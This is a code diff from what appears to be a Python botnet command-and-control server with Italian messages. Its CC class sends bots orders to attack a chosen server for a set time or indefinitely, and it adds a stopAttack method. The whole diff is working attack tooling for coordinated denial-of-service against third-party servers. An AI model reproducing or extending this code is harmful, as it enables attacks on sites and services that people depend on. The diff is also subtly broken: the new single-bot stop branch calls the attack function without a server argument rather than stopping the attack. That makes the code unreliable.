@@ -80,27 +80,50 @@ class CC:
 
         print("Controllo terminato")
 
-    def makeHTTPRequest(self, server, path, time=1, target=""):
+    def makeHTTPRequest(self, server, time=1, target=""):
         print("Invio richiesta...")
         if target == "":
             for k, v in self.activeBot.items():
                 try:
-                    url = "http://" + k + ":" + str(v["http"]) + path
+                    url = "http://" + k + ":" + str(v["http"]) + "/doGet"
                     response = requests.post(url, json={"url": server, "time":time}, timeout=10)
                     res = response.json()
                     self.activeBot[k]["target"] = res["target"]
                     self.activeBot[k]["action"] = res["action"]
                 except Exception as e:
-                    print("Impossibile inviare la richiesta a ",k)
+                    print("Impossibile inviare la richiesta a",k, e)
         else:
             try:
-                url = "http://" + target + ":" + str(self.activeBot[target]["http"]) + path
-                response = requests.post(url, json={"url": server, "time": time})
+                url = "http://" + target + ":" + str(self.activeBot[target]["http"]) + "/doGet"
+                response = requests.post(url, json={"url": server, "time": time}, timeout=10)
                 res = response.json()
                 self.activeBot[target]["target"] = res["target"]
                 self.activeBot[target]["action"] = res["action"]
             except Exception as e:
-                print(e)
+                print("Impossibile inviare la richiesta a", target, e)
+        print("Richiesta inviata")
+
+    def stopAttack(self, target=""):
+        print("Invio richiesta...")
+        if target == "":
+            for k, v in self.activeBot.items():
+                try:
+                    url = "http://" + k + ":" + str(v["http"]) + "/stopAttack"
+                    response = requests.get(url, timeout=10)
+                    res = response.json()
+                    self.activeBot[k]["target"] = res["target"]
+                    self.activeBot[k]["action"] = res["action"]
+                except Exception as e:
+                    print("Impossibile inviare la richiesta a",k, e)
+        else:
+            try:
+                url = "http://" + target + ":" + str(self.activeBot[target]["http"]) + "/stopAttack"
+                response = requests.get(url, timeout=10)
+                res = response.json()
+                self.activeBot[target]["target"] = res["target"]
+                self.activeBot[target]["action"] = res["action"]
+            except Exception as e:
+                print("Impossibile inviare la richiesta a", target, e)
         print("Richiesta inviata")
 
     def getSystemInfo(self, target=""):
@@ -156,20 +179,20 @@ class CC:
                 if len(c) == 1 or len(c) == 2:
                     print("Command not found")
                 if c[3] == "all":
-                    self.makeHTTPRequest(c[1], "/doGet", time=c[2])
+                    self.makeHTTPRequest(c[1], time=c[2])
                 elif c[3] in self.activeBot:
-                    self.makeHTTPRequest(c[1], "/doGet", time=c[2], target=c[3])
+                    self.makeHTTPRequest(c[1], time=c[2], target=c[3])
                 else:
                     print("Command not found. Correct command [get [server] [time(int)(-1 for infinite attack)] [all | target(ip)]]")
             #Comando per fermare tutti gli attacchi
             elif comando.startswith("stop"):
                 c = comando.split(" ")
-                if len(c) == 1 or len(c) == 2:
+                if len(c) == 1:
                     print("Command not found")
-                if c[3] == "all":
-                    self.makeHTTPRequest(c[1], "/stopAttack", time=c[2])
-                elif c[3] in self.activeBot:
-                    self.makeHTTPRequest(c[1], "/stopAttack", time=c[2], target=c[3])
+                if c[1] == "all":
+                    self.stopAttack()
+                elif c[1] in self.activeBot:
+                    self.makeHTTPRequest(target=c[1])
                 else:
                     print("Command not found. Correct command [stop [all | target(ip)]]")
             #Comando per acquisire informazioni sul sistema che ospita il bot
